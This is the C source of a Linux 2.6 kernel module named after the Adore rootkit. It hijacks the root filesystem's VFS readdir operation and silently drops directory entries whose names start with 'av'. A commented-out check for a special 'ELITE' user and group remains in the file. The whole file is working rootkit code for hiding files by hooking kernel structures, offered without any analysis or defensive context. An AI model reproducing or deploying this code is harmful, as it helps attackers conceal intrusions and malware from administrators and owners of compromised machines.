#ifndef __KERNEL__
#define __KERNEL__
#endif



#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/init.h>




char *root_fs = "/";

typedef int (*readdir_t)(struct file *, void *, filldir_t);
readdir_t orig_root_readdir=NULL;

filldir_t root_filldir = NULL;
struct super_block *root_sb[1024];


int my_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
{
	struct inode *inode = NULL;
	int r = 0;
	uid_t uid;
	gid_t gid;
	char reiser = 0;


	if (!root_sb[current->pid % 1024])
		return 0;

	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
	 * without the unlock_new_inode() doesnt crash, but deadlocks
	 * time to time. So I basically emulate iget() without
	 * the sb->s_op->read_inode(inode); and so it doesnt crash or deadlock.
	 */
	reiser = (strcmp(root_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);
	if (reiser) {
		if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	} else {
		if ((inode = iget(root_sb[current->pid % 1024], ino)) == NULL)
			return 0;
	}

	uid = inode->i_uid;
	gid = inode->i_gid;

	if (reiser) {
		if (inode->i_state & I_NEW)
			unlock_new_inode(inode);
	}

	iput(inode);

	/* Is it hidden ? */
	/*
	if (uid == ELITE_UID && gid == ELITE_GID) {
		r = 0;
	*/
	if( !strncmp(name,"av",2) ) {
		r=0;
	} else if (root_filldir) {
		r = root_filldir(buf, name, nlen, off, ino, x);
	}

	return r;
}


int my_root_readdir(struct file *fp, void *buf, filldir_t filldir)
{
	int r = 0;

	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf || !filldir || !orig_root_readdir)
		return 0;

	root_filldir = filldir;
	root_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
	r = orig_root_readdir(fp, buf, my_root_filldir);
        
	return r;
}


int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
{
	struct file *filep;

	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}

	if (orig_readdir)
		*orig_readdir = filep->f_op->readdir;

	((struct file_operations *)(filep->f_op))->readdir =new_readdir;
	filp_close(filep, 0);
	
	return 0;
}


int unpatch_vfs(const char *p, readdir_t orig_readdir)
{
	struct file *filep;
        
	filep = filp_open(p, O_RDONLY|O_DIRECTORY, 0);
	if (IS_ERR(filep)) {
		return -1;
	}

	((struct file_operations *)(filep->f_op))->readdir = orig_readdir;
	filp_close(filep, 0);
	
	return 0;
}

static int __init adore_init(void)
{
	patch_vfs(root_fs, &orig_root_readdir, my_root_readdir);
	printk(KERN_WARNING "init ok\n");
	return 0;
}


static void __exit adore_cleanup(void)
{
	unpatch_vfs(root_fs, orig_root_readdir);
	printk(KERN_WARNING "uninit ok\n");
}

module_init(adore_init);
module_exit(adore_cleanup);
